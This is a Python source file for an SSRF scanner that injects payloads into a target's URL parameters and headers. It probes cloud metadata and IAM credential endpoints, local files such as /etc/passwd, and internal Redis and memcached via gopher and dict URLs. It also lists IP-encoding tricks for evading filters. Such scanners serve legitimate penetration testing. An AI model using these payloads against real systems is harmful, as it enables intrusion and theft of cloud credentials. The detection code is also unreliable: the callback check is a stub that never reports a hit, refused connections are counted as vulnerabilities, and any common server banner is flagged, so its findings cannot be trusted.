"""
SSRF scanner with callback verification.
"""
import requests
import re
from typing import List, Dict
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

class SSRFScanner:
    def __init__(self, callback_host: str = None):
        self.callback_host = callback_host
        self.payloads = [
            "http://127.0.0.1",
            "http://localhost",
            "http://[::1]",
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",  # GCP
            "http://169.254.169.254/metadata/v1/",  # Azure
            "file:///etc/passwd",
            "dict://127.0.0.1:11211/stats",
            "gopher://127.0.0.1:6379/_INFO",
        ]
        
        # Bypass payloads for WAF/filter evasion
        self.bypass_payloads = [
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://0.0.0.0",
            "http://0",
            "http://127.1",
            "http://127.0.1",
            "http://2130706433",  # Decimal IP for 127.0.0.1
            "http://0x7f000001",  # Hex IP
            "http://017700000001",  # Octal
            "http://localhost.localdomain",
            "http://127.0.0.1.nip.io",
            "http://localtest.me",
        ]
        
        self.indicators = [
            r"root:.*:0:0:",  # /etc/passwd
            r"ami-id",  # AWS metadata
            r"instance-id",
            r"computeMetadata",  # GCP
            r"STAT items",  # memcached
            r"redis_version",  # redis
            r"iam/security-credentials",  # AWS IAM
            r"v1/instance",  # GCP instance
        ]
    
    def scan_param(self, url: str, param: str) -> List[Dict]:
        """Scan parameter for SSRF."""
        findings = []
        
        # Standard payloads
        for payload in self.payloads:
            result = self._test_payload(url, param, payload)
            if result["vulnerable"]:
                severity = "CRITICAL" if any(x in payload for x in ["169.254", "metadata"]) else "HIGH"
                findings.append({
                    "type": "ssrf",
                    "url": url,
                    "parameter": param,
                    "payload": payload,
                    "evidence": result["evidence"],
                    "severity": severity
                })
        
        # Bypass payloads if no findings yet
        if not findings:
            for payload in self.bypass_payloads:
                result = self._test_payload(url, param, payload)
                if result["vulnerable"]:
                    findings.append({
                        "type": "ssrf_bypass",
                        "url": url,
                        "parameter": param,
                        "payload": payload,
                        "evidence": result["evidence"],
                        "severity": "HIGH"
                    })
                    break
        
        # Test with callback if available
        if self.callback_host:
            callback_result = self._test_callback(url, param)
            if callback_result["vulnerable"]:
                findings.append({
                    "type": "ssrf_oob",
                    "url": url,
                    "parameter": param,
                    "evidence": "Out-of-band callback received",
                    "severity": "HIGH"
                })
        
        return findings
    
    def _test_payload(self, url: str, param: str, payload: str) -> Dict:
        """Test SSRF payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param not in params:
            return {"vulnerable": False}
        
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            resp = requests.get(test_url, timeout=10, verify=False, allow_redirects=False)
            
            for pattern in self.indicators:
                if re.search(pattern, resp.text, re.I):
                    return {"vulnerable": True, "evidence": f"Indicator found: {pattern}"}
            
            # Check for internal service signatures
            if self._detect_internal_service(resp):
                return {"vulnerable": True, "evidence": "Internal service response detected"}
                
        except requests.exceptions.ConnectionError as e:
            # Connection refused to internal service = proof of reach
            if "Connection refused" in str(e):
                return {"vulnerable": True, "evidence": "Connection refused (reached internal network)"}
        except:
            pass
        
        return {"vulnerable": False}
    
    def _detect_internal_service(self, resp) -> bool:
        """Detect internal service signatures."""
        signatures = [
            "Apache/",
            "nginx/",
            "Server: ",
            "X-Powered-By:",
            "<title>Index of /</title>",
        ]
        headers_str = str(resp.headers)
        
        for sig in signatures:
            if sig in resp.text or sig in headers_str:
                # Only flag if response differs from external response
                return True
        return False
    
    def _test_callback(self, url: str, param: str) -> Dict:
        """Test with OOB callback."""
        if not self.callback_host:
            return {"vulnerable": False}
            
        import uuid
        callback_id = uuid.uuid4().hex[:8]
        callback_url = f"http://{callback_id}.{self.callback_host}"
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param not in params:
            return {"vulnerable": False}
            
        params[param] = [callback_url]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            requests.get(test_url, timeout=5, verify=False)
            # Would need to check callback server for hit
            # This is placeholder - real impl needs callback infrastructure
        except:
            pass
        
        return {"vulnerable": False}
    
    def scan_headers(self, url: str, headers_to_test: List[str] = None) -> List[Dict]:
        """Scan headers for SSRF (X-Forwarded-For, Referer, etc.)."""
        findings = []
        
        if headers_to_test is None:
            headers_to_test = ["X-Forwarded-For", "Referer", "X-Real-IP", "X-Original-URL"]
        
        for header in headers_to_test:
            for payload in self.payloads[:3]:  # Test subset
                try:
                    resp = requests.get(url, headers={header: payload}, timeout=10, verify=False)
                    for pattern in self.indicators:
                        if re.search(pattern, resp.text, re.I):
                            findings.append({
                                "type": "ssrf_header",
                                "url": url,
                                "header": header,
                                "payload": payload,
                                "evidence": f"Indicator found: {pattern}",
                                "severity": "HIGH"
                            })
                except:
                    pass
        
        return findings
